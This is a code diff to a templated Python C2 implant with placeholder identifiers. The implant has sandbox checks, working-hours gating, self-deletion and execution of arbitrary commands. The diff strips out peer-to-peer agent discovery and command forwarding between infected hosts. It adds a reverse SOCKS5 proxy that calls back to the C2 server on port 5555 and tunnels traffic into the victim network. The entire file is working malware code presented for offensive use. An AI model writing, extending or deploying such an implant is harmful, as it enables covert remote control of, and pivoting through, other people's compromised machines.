@@ -83,12 +83,7 @@ class {class_name}:
         self.{v_secret_key} = None  # Will be set during registration
         self.{v_fernet} = None     # Fernet instance for encryption/decryption
 
-        self.{v_p2p_enabled} = {p2p_enabled}  # Configurable P2P capability
-        self.{v_p2p_port} = {p2p_port}  # Configurable P2P port
-        self.{v_local_agents} = {{}}  # Track local agents on network
-        self.{v_p2p_server} = None
-        self.{v_p2p_discovery_timer} = None
-        self.{v_p2p_command_queue} = []  # Queue for forwarded commands
+        # P2P functionality has been removed
 
         self.{v_sandbox_enabled} = {sandbox_check_enabled}
 
@@ -115,6 +110,11 @@ class {class_name}:
             'timezone': "{working_hours_timezone}",
             'days': {working_hours_days}
         }}
+
+        # Reverse proxy variables
+        self.{v_reverse_proxy_active} = False
+        self.{v_reverse_proxy_stop_event} = threading.Event()
+        self.{v_reverse_proxy_thread} = None
 
         {dead_code_2}
 
@@ -822,224 +822,13 @@ class {class_name}:
             # Force exit
             os._exit(0)
 
-    def {m_setup_p2p_communication}(self):
-        if self.{v_p2p_enabled}:
-            p2p_thread = threading.Thread(target=self.{m_start_p2p_server}, daemon=True)
-            p2p_thread.start()
-            
-            discovery_thread = threading.Thread(target=self.{m_discover_local_agents}, daemon=True)
-            discovery_thread.start()
     
-    def {m_start_p2p_server}(self):
-        import socket
-        import json
-        
-        try:
-            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            server_socket.bind(('', self.{v_p2p_port}))
-            server_socket.listen(5)
-            self.{v_p2p_server} = server_socket
-            
-            while self.{v_running}:
-                try:
-                    client_socket, addr = server_socket.accept()
-                    client_thread = threading.Thread(
-                        target=self.{m_handle_p2p_request}, 
-                        args=(client_socket, addr),
-                        daemon=True
-                    )
-                    client_thread.start()
-                except:
-                    break
-        except Exception as e:
-            pass
 
-    def {m_stop_p2p_server}(self):
-        if self.{v_p2p_server}:
-            try:
-                self.{v_p2p_server}.close()
-            except:
-                pass
-            self.{v_p2p_server} = None
 
-    def {m_discover_local_agents}(self):
-        import socket
-        import struct
-        
-        discovery_interval = 30  # seconds
-        port_range = range(self.{v_p2p_port}-5, self.{v_p2p_port}+5)  # Look for agents on nearby ports
-        
-        while self.{v_running}:
-            try:
-                for port in port_range:
-                    if port == self.{v_p2p_port}:  # Skip own port
-                        continue
-                        
-                    test_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    test_socket.settimeout(2)
-                    
-                    try:
-                        result = test_socket.connect_ex(('127.0.0.1', port))
-                        if result == 0:
-                            discovery_msg = {{
-                                'type': 'discovery',
-                                'agent_id': self.{v_agent_id},
-                                'hostname': self.{v_hostname},
-                                'port': self.{v_p2p_port}
-                            }}
-                            test_socket.send(json.dumps(discovery_msg).encode())
-                            
-                            response = test_socket.recv(1024)
-                            if response:
-                                try:
-                                    response_data = json.loads(response.decode())
-                                    if response_data.get('type') == 'discovery_response':
-                                        # Add to local agents
-                                        agent_addr = "127.0.0.1:" + str(port)
-                                        self.{v_local_agents}[agent_addr] = {{
-                                            'agent_id': response_data['agent_id'],
-                                            'hostname': response_data['hostname'],
-                                            'last_seen': time.time()
-                                        }}
-                                except:
-                                    pass
-                    except:
-                        pass
-                    finally:
-                        try:
-                            test_socket.close()
-                        except:
-                            pass
-                
-                self.{m_broadcast_presence}()
-                
-                time.sleep(discovery_interval)
-            except:
-                time.sleep(60)  # Wait longer on error
 
-    def {m_broadcast_presence}(self):
-        import socket
-        
-        try:
-            broadcast_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            broadcast_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
-            broadcast_socket.settimeout(2)
-            
-            discovery_msg = {{
-                'type': 'discovery',
-                'agent_id': self.{v_agent_id},
-                'hostname': self.{v_hostname},
-                'port': self.{v_p2p_port}
-            }}
-            
-            broadcast_socket.sendto(
-                json.dumps(discovery_msg).encode(), 
-                ('<broadcast>', self.{v_p2p_port})
-            )
-            
-            for offset in [1, -1, 2, -2]:
-                try:
-                    broadcast_socket.sendto(
-                        json.dumps(discovery_msg).encode(),
-                        ('<broadcast>', self.{v_p2p_port} + offset)
-                    )
-                except:
-                    pass
-                    
-            broadcast_socket.close()
-        except:
-            pass
 
-    def {m_handle_p2p_request}(self, client_socket, addr):
-        import json
-        
-        try:
-            data = client_socket.recv(4096)
-            if data:
-                try:
-                    msg = json.loads(data.decode())
-                    
-                    if msg.get('type') == 'discovery':
-                        response = {{
-                            'type': 'discovery_response',
-                            'agent_id': self.{v_agent_id},
-                            'hostname': self.{v_hostname}
-                        }}
-                        client_socket.send(json.dumps(response).encode())
-                        
-                        agent_addr = str(addr[0]) + ":" + str(addr[1])
-                        self.{v_local_agents}[agent_addr] = {{
-                            'agent_id': msg['agent_id'],
-                            'hostname': msg['hostname'],
-                            'last_seen': time.time()
-                        }}
-                        
-                    elif msg.get('type') == 'command_forward':
-                        result = self.{m_receive_forwarded_command}(msg)
-                        response = {{'result': result}}
-                        client_socket.send(json.dumps(response).encode())
-                        
-                except json.JSONDecodeError:
-                    pass
-        except:
-            pass
-        finally:
-            try:
-                client_socket.close()
-            except:
-                pass
 
-    def {m_forward_command}(self, target_agent_addr, command):
-        import json
-        import socket
-        
-        try:
-            if ':' not in target_agent_addr:
-                return "[ERROR] Invalid target address format. Expected host:port"
-            
-            addr_parts = target_agent_addr.split(':', 1)
-            if len(addr_parts) != 2:
-                return "[ERROR] Invalid target address format. Expected host:port"
-                
-            host = addr_parts[0]
-            try:
-                port = int(addr_parts[1])
-            except ValueError:
-                return "[ERROR] Invalid port number in target address"
-            
-            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client_socket.settimeout(10)
-            client_socket.connect((host, port))
-            
-            cmd_msg = {{
-                'type': 'command_forward',
-                'source_agent_id': self.{v_agent_id},
-                'command': command,
-                'timestamp': time.time()
-            }}
-            
-            client_socket.send(json.dumps(cmd_msg).encode())
-            
-            result_data = client_socket.recv(8192)
-            result = json.loads(result_data.decode())
-            
-            client_socket.close()
-            
-            return result.get('result', 'No result received')
-            
-        except Exception as e:
-            return f"[ERROR] Failed to forward command: {{str(e)}}"
 
-    def {m_receive_forwarded_command}(self, msg):
-        try:
-            command = msg['command']
-            
-            result = self.{m_exec}(command)
-            return result
-            
-        except Exception as e:
-            return f"[ERROR] Failed to execute forwarded command: {{str(e)}}"
 
 
     def {m_handle_upload}(self, command):
@@ -1155,36 +944,14 @@ class {class_name}:
                             result = "[ERROR] Sleep interval must be a valid integer"
                         except Exception as e:
                             result = f"[ERROR] Failed to change sleep interval: {{str(e)}}"
-                    elif command.startswith('p2p '):
-                        try:
-                            parts = command.split(' ', 2)  # Split into at most 3 parts: ['p2p', 'command', 'rest']
-                            if len(parts) < 2:
-                                result = "[ERROR] Invalid P2P command format. Usage: p2p <command> [args]"
-                            else:
-                                p2p_cmd = parts[1]
-                                if p2p_cmd == 'list':
-                                    if self.{v_local_agents}:
-                                        agent_list = []
-                                        for addr, info in self.{v_local_agents}.items():
-                                            agent_list.append("Agent: " + str(info['agent_id']) + ", Hostname: " + str(info['hostname']) + ", Addr: " + str(addr))
-                                        result = "[P2P AGENTS]\n" + "\n".join(agent_list)
-                                    else:
-                                        result = "[P2P] No agents discovered on local network"
-                                elif p2p_cmd == 'forward' and len(parts) == 3:
-                                    target_addr_parts = parts[2].split(' ', 1)
-                                    if len(target_addr_parts) >= 2:
-                                        target_addr = target_addr_parts[0]
-                                        forwarded_command = target_addr_parts[1]
-                                        result = self.{m_forward_command}(target_addr, forwarded_command)
-                                    else:
-                                        result = "[ERROR] Invalid P2P forward command format. Usage: p2p forward <target_addr> <command>"
-                                elif p2p_cmd == 'discover':
-                                    self.{m_discover_local_agents}()
-                                    result = "[P2P] Discovery initiated"
-                                else:
-                                    result = "[ERROR] Unknown P2P command: " + str(p2p_cmd) + ". Available: list, forward <addr> <command>, discover"
-                        except Exception as e:
-                            result = f"[ERROR] P2P command failed: {{str(e)}}"
+                    elif command == 'reverse_proxy_start':
+                        # Start reverse proxy in a separate thread
+                        proxy_thread = threading.Thread(target=self.{m_start_reverse_proxy}, daemon=True)
+                        proxy_thread.start()
+                        result = "[SUCCESS] Reverse proxy started."
+                    elif command == 'reverse_proxy_stop':
+                        self.{m_stop_reverse_proxy}()
+                        result = "[SUCCESS] Reverse proxy stopped."
                     else:
                         result = self.{m_exec}(command)
                     self.{m_submit_interactive_result}(task_id, result)
@@ -1224,7 +991,7 @@ class {class_name}:
         while not self.{m_register}():
             time.sleep(30)
             
-        self.{m_setup_p2p_communication}()
+        # P2P functionality has been removed
         
         self.{v_running} = True
         check_count = 0
@@ -1300,40 +1067,16 @@ class {class_name}:
                                     result = "[ERROR] Sleep interval must be a valid integer"
                                 except Exception as e:
                                     result = f"[ERROR] Failed to change sleep interval: {{str(e)}}"
-                            elif command.startswith('p2p '):
-                                # Handle P2P commands: p2p list, p2p forward <target> <command>, etc.
-                                try:
-                                    parts = command.split(' ', 2)  # Split into at most 3 parts: ['p2p', 'command', 'rest']
-                                    if len(parts) < 2:
-                                        result = "[ERROR] Invalid P2P command format. Usage: p2p <command> [args]"
-                                    else:
-                                        p2p_cmd = parts[1]
-                                        if p2p_cmd == 'list':
-                                            if self.{v_local_agents}:
-                                                agent_list = []
-                                                for addr, info in self.{v_local_agents}.items():
-                                                    agent_list.append("Agent: " + str(info['agent_id']) + ", Hostname: " + str(info['hostname']) + ", Addr: " + str(addr))
-                                                result = "[P2P AGENTS]\n" + "\n".join(agent_list)
-                                            else:
-                                                result = "[P2P] No agents discovered on local network"
-                                        elif p2p_cmd == 'forward' and len(parts) == 3:
-                                            target_addr_parts = parts[2].split(' ', 1)
-                                            if len(target_addr_parts) >= 2:
-                                                target_addr = target_addr_parts[0]
-                                                forwarded_command = target_addr_parts[1]
-                                                result = self.{m_forward_command}(target_addr, forwarded_command)
-                                            else:
-                                                result = "[ERROR] Invalid P2P forward command format. Usage: p2p forward <target_addr> <command>"
-                                        elif p2p_cmd == 'discover':
-                                            # Manually trigger discovery
-                                            self.{m_discover_local_agents}()
-                                            result = "[P2P] Discovery initiated"
-                                        else:
-                                            result = "[ERROR] Unknown P2P command: " + str(p2p_cmd) + ". Available: list, forward <addr> <command>, discover"
-                                except Exception as e:
-                                    result = f"[ERROR] P2P command failed: {{str(e)}}"
                             elif command.startswith('kill'):
                                 self.{m_self_delete}()
+                            elif command == 'reverse_proxy_start':
+                                # Start reverse proxy in a separate thread
+                                proxy_thread = threading.Thread(target=self.{m_start_reverse_proxy}, daemon=True)
+                                proxy_thread.start()
+                                result = "[SUCCESS] Reverse proxy started."
+                            elif command == 'reverse_proxy_stop':
+                                self.{m_stop_reverse_proxy}()
+                                result = "[SUCCESS] Reverse proxy stopped."
                             else:
                                 result = self.{m_exec}(command)
 
@@ -1369,8 +1112,261 @@ class {class_name}:
     def {m_stop_agent}(self):
         self.{v_running} = False
         self.{m_exit_interactive_mode}()
-        self.{m_stop_p2p_server}()
+        # P2P functionality has been removed
         {dead_code_4}
+
+    def {m_start_reverse_proxy}(self):
+        if self.{v_reverse_proxy_active}:
+            return
+
+        self.{v_reverse_proxy_active} = True
+        self.{v_reverse_proxy_stop_event}.clear()
+
+        try:
+            import socket
+            import struct
+            import threading
+            import select
+
+            # Parse the C2 URL to get the host
+            if self.{v_current_c2_url}.startswith('https://'):
+                host = self.{v_current_c2_url}[8:]  # Remove 'https://'
+            else:
+                host = self.{v_current_c2_url}[7:]  # Remove 'http://'
+
+            # Extract host and port (we don't need c2_port for reverse proxy)
+            if ':' in host:
+                host, port_str = host.split(':', 1)
+
+            # Connect to the C2 server on port 5555 for reverse proxy
+            remote_addr = (host, 5555)
+
+            while self.{v_running} and not self.{v_reverse_proxy_stop_event}.is_set():
+                try:
+                    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+                    # Set timeout for connection attempt
+                    conn.settimeout(10)
+                    conn.connect(remote_addr)
+
+                    # Clear timeout for data transfer
+                    conn.settimeout(None)
+
+                    # Handle SOCKS5 protocol on this connection
+                    self.{m_handle_socks5}(conn)
+                    conn.close()
+
+                    # Check if stop was requested before reconnecting
+                    if self.{v_reverse_proxy_stop_event}.is_set():
+                        break
+
+                    time.sleep(2)  # Wait before reconnecting
+
+                except Exception:
+                    if self.{v_reverse_proxy_stop_event}.is_set():
+                        break
+                    time.sleep(5)  # Wait before retrying
+                    continue
+
+        except Exception:
+            pass
+        finally:
+            self.{v_reverse_proxy_active} = False
+
+    def {m_stop_reverse_proxy}(self):
+        if not self.{v_reverse_proxy_active}:
+            return
+
+        self.{v_reverse_proxy_stop_event}.set()
+
+        # Wait for the proxy to fully stop
+        import time
+        timeout = 10  # 10 second timeout
+        start_time = time.time()
+        while self.{v_reverse_proxy_active} and (time.time() - start_time) < timeout:
+            time.sleep(0.1)
+
+    def {m_handle_socks5}(self, server_conn):
+        try:
+            # Set timeout for initial handshake
+            server_conn.settimeout(30)
+
+            # Read greeting from client (should be from C2 server acting as SOCKS client)
+            greeting = server_conn.recv(2)
+            if not greeting or len(greeting) != 2 or greeting[0] != 0x05:
+                server_conn.close()
+                return
+
+            n_methods = greeting[1]
+            if n_methods <= 0 or n_methods > 255:
+                server_conn.close()
+                return
+
+            # Read the methods
+            methods = server_conn.recv(n_methods)
+            if not methods:
+                server_conn.close()
+                return
+
+            # Send response: version 5, no authentication
+            server_conn.sendall(b'\x05\x00')
+
+            # Clear timeout for main connection
+            server_conn.settimeout(None)
+
+            # Handle multiple SOCKS requests over the same connection
+            while True:
+                # Read request header
+                header = server_conn.recv(4)
+                if not header or len(header) != 4 or header[0] != 0x05:
+                    break
+
+                cmd = header[1]
+                if cmd != 0x01:  # CONNECT command only
+                    # Send error response
+                    server_conn.sendall(b'\x05\x07\x00\x01\x00\x00\x00\x00\x00\x00')  # Command not supported
+                    continue
+
+                addr_type = header[3]
+
+                # Read address and port
+                if addr_type == 0x01:  # IPv4
+                    addr_bytes = server_conn.recv(4)
+                    port_bytes = server_conn.recv(2)
+                    if not addr_bytes or not port_bytes:
+                        break
+                    addr = socket.inet_ntoa(addr_bytes)
+                elif addr_type == 0x03:  # Domain name
+                    addr_len = ord(server_conn.recv(1))
+                    addr_bytes = server_conn.recv(addr_len)
+                    if not addr_bytes:
+                        break
+                    addr = addr_bytes.decode('utf-8')
+
+                    port_bytes = server_conn.recv(2)
+                    if not port_bytes:
+                        break
+                    # Agent-side DNS resolution - prefer IPv4 then IPv6
+                    resolved_addr = None
+                    try:
+                        import socket
+                        # Try IPv4 first
+                        try:
+                            result = socket.getaddrinfo(addr, None, socket.AF_INET, socket.SOCK_STREAM)
+                            for res in result:
+                                ip = res[4][0]
+                                if ip and not (ip.startswith("0.") or ip.startswith("169.254")):  # Skip invalid IPs
+                                    resolved_addr = ip
+                                    break
+                        except:
+                            pass
+
+                        # If IPv4 failed, try IPv6
+                        if not resolved_addr:
+                            try:
+                                result = socket.getaddrinfo(addr, None, socket.AF_INET6, socket.SOCK_STREAM)
+                                for res in result:
+                                    ip = res[4][0]
+                                    if ip and not ip.startswith("fe80"):  # Skip link-local IPv6
+                                        resolved_addr = ip
+                                        break
+                            except:
+                                pass
+                    except:
+                        pass
+
+                    if not resolved_addr:
+                        # Send error response for DNS failure
+                        server_conn.sendall(b'\x05\x04\x00\x01\x00\x00\x00\x00\x00\x00')  # Host unreachable
+                        continue
+                    else:
+                        addr = resolved_addr
+                elif addr_type == 0x04:  # IPv6
+                    addr_bytes = server_conn.recv(16)
+                    port_bytes = server_conn.recv(2)
+                    if not addr_bytes or not port_bytes:
+                        break
+                    addr = socket.inet_ntop(socket.AF_INET6, addr_bytes)
+                else:
+                    # Send error response
+                    server_conn.sendall(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')  # Address type not supported
+                    continue
+
+                port = struct.unpack('>H', port_bytes)[0]
+
+                # Connect to target
+                try:
+                    target_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    target_conn.connect((addr, port))
+
+                    # Send success response
+                    server_conn.sendall(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')
+
+                    # Relay data between server connection and target connection
+                    self.{m_relay_data}(server_conn, target_conn)
+
+                except Exception:
+                    # Send connection refused response
+                    server_conn.sendall(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
+                    # Continue to accept next SOCKS request on same server connection
+                    continue
+
+        except Exception:
+            pass
+        finally:
+            try:
+                server_conn.close()
+            except:
+                pass
+
+    def {m_relay_data}(self, conn1, conn2):
+        import threading
+
+        def relay(src, dst, name1, name2):
+            try:
+                while True:
+                    data = src.recv(4096)
+                    if not data:
+                        break
+                    dst.sendall(data)
+            except Exception:
+                pass
+            finally:
+                # Properly close write side to signal end of data
+                try:
+                    if hasattr(socket, 'SHUT_WR'):
+                        src.shutdown(socket.SHUT_RD)  # Stop reading on source
+                        dst.shutdown(socket.SHUT_WR)  # Stop writing to destination
+                    else:
+                        src.close()
+                        dst.close()
+                except:
+                    try:
+                        src.close()
+                        dst.close()
+                    except:
+                        pass
+
+        # Start two threads for bidirectional relay
+        thread1 = threading.Thread(target=relay, args=(conn1, conn2, "conn1", "conn2"), daemon=True)
+        thread2 = threading.Thread(target=relay, args=(conn2, conn1, "conn2", "conn1"), daemon=True)
+
+        thread1.start()
+        thread2.start()
+
+        # Wait for both threads to complete
+        thread1.join(timeout=60)
+        thread2.join(timeout=60)
+
+        # Ensure both connections are closed
+        try:
+            conn1.close()
+        except:
+            pass
+        try:
+            conn2.close()
+        except:
+            pass
 
 if __name__ == '__main__':
     try:
